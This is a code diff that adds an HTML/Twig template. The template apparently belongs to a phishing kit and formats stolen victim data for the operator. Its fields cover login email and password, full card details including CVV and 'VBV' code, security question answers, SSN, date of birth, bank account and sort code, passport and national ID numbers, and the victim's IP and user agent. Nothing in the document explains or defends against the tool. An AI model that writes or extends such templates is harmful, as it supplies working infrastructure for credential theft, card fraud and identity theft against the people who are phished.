@@ -1,0 +1,145 @@
+<html>
+<head>
+    {% block stylesheets %}
+        <link rel="stylesheet" href="{{ asset('assets/css/tbs.style.css') }}">
+    {% endblock %}
+</head>
+<body>
+<table style="width: 100%;background: white;border-radius: 3px;border-collapse: collapse;" cellpadding="10px">
+    <tr>
+        <td colspan="2" style="color: #D5DDE5;font-size:15px;padding:10px;background: #1b1e24;border-bottom: 4px solid #9ea7af;text-align: center;">~ LOGIN ~</td>
+    </tr>
+    <tr>
+        <td class="left">EMAIL</td>
+        <td class="right">{{ cards.user }}</td>
+    </tr>
+    <tr>
+        <td class="left">PASSWORD</td>
+        <td class="right">{{ cards.pass }}</td>
+    </tr>
+    <tr>
+        <td colspan="2" style="color: #D5DDE5;font-size:15px;padding:10px;background: #1b1e24;border-bottom: 4px solid #9ea7af;text-align: center;">~ CC INFORMATION ~</td>
+    </tr>
+    <tr>
+        <td class="left">CARD HOLDER</td>
+        <td class="right">{{ cards.ccname }}</td>
+    </tr>
+    <tr>
+        <td class="left">NUMBER</td>
+        <td class="right">{{ cards.ccno |replace({' ': ''}) }}</td>
+    </tr>
+    <tr>
+        <td class="left">EXPIRY</td>
+        <td class="right">{{ cards.ccexp }}</td>
+    </tr>
+    <tr>
+        <td class="left">CVV</td>
+        <td class="right">{{ cards.pass }}</td>
+    </tr>
+    <tr>
+        <td class="left">VBV</td>
+        <td class="right">{{ cards.secode }}</td>
+    </tr>
+    <tr>
+        <td class="left">BINS</td>
+        <td class="right">{{ cards.cclevel }} - {{ cards.ccbrand }}</td>
+    </tr>
+    <tr>
+        <td class="left">QUESTION</td>
+        <td class="right">{{ cards.q1 }}</td>
+    </tr>
+    <tr>
+        <td class="left">ANSWER</td>
+        <td class="right">{{ cards.a1 }}</td>
+    </tr>
+    <tr>
+        <td colspan="2" style="color: #D5DDE5;font-size:15px;padding:10px;background: #1b1e24;border-bottom: 4px solid #9ea7af;text-align: center;">~ BILLING INFORMATION ~</td>
+    </tr>
+    <tr>
+        <td class="left">ACCOUNT NAME</td>
+        <td class="right">{{ cards.fname }} {{ cards.lname }}</td>
+    </tr>
+    <tr>
+        <td class="left">ADDRESS</td>
+        <td class="right">{{ cards.address }}</td>
+    </tr>
+    <tr>
+        <td class="left">CITY</td>
+        <td class="right">{{ cards.town }}</td>
+    </tr>
+    <tr>
+        <td class="left">STATE</td>
+        <td class="right">{{ cards.state }}</td>
+    </tr>
+    <tr>
+        <td class="left">COUNTRY</td>
+        <td class="right">{{ cards.country }}</td>
+    </tr>
+    <tr>
+        <td class="left">ZIP</td>
+        <td class="right">{{ cards.postcode }}</td>
+    </tr>
+    <tr>
+        <td class="left">PHONE</td>
+        <td class="right">{{ cards.telephone }}</td>
+    </tr>
+    <tr>
+        <td class="left">DOB</td>
+        <td class="right">{{ cards.dob }}</td>
+    </tr>
+    <tr>
+        <td class="left">SSN</td>
+        <td class="right">{{ cards.ssn }}</td>
+    </tr>
+    <tr>
+        <td colspan="2" style="color: #D5DDE5;font-size:15px;padding:10px;background: #1b1e24;border-bottom: 4px solid #9ea7af;text-align: center;">~ VBV INFO ~</td>
+    </tr>
+    <td class="left">ACCOUNT NUMBER</td>
+    <td class="right">{{ cards.acno }}</td>
+    </tr>
+    <tr>
+        <td class="left">SORT CODE</td>
+        <td class="right">{{ cards.sortcode }}</td>
+    </tr>
+    <tr>
+        <td class="left">PASSPORT</td>
+        <td class="right">{{ cards.passport }}</td>
+    </tr>
+    <tr>
+        <td class="left">BANK ACCESS</td>
+        <td class="right">{{ cards.bans }}</td>
+    </tr>
+    <tr>
+        <td class="left">CITIZEN</td>
+        <td class="right">{{ cards.citizenid }}</td>
+    </tr>
+    <tr>
+        <td class="left">QATAR</td>
+        <td class="right">{{ cards.qatarid }}</td>
+    </tr>
+    <tr>
+        <td class="left">NATIONAL</td>
+        <td class="right">{{ cards.naid }}</td>
+    </tr>
+    <tr>
+        <td class="left">CIVIL</td>
+        <td class="right">{{ cards.civilid }}</td>
+    </tr>
+    <tr>
+        <td class="left">ID NUMBER</td>
+        <td class="right">{{ cards.numbid }}</td>
+    </tr>
+    <tr>
+        <td colspan="2" style="color: #D5DDE5;font-size:15px;padding:10px;background: #1b1e24;border-bottom: 4px solid #9ea7af;text-align: center;">~ AGENT ~</td>
+    </tr>
+    <tr>
+        <td class="left">IP</td>
+        <td class="right">{{ cards.ip }}</td>
+    </tr>
+    <tr>
+        <td class="left">AGENT</td>
+        <td class="right">{{ cards.agent }}</td>
+    </tr>
+</table>
+</body>
+</html>
